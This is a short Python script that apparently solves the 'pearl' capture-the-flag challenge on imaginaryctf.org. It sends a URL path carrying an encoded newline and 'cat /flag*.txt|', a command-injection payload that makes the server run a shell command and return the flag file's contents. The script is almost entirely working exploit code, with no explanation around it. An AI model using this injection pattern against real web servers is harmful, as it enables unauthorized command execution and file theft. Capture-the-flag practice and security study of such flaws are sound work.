import requests

session = requests.Session()
payload = "%0A%20cat%20/flag*.txt|"
base_url = "http://pearl.chal.imaginaryctf.org"

def get_flag():
    resp = session.get(f"{base_url}/{payload}")
    return resp.text

def main():
    flag = get_flag()
    if flag:
        print(flag)
    else:
        print("Flag not found.")

main()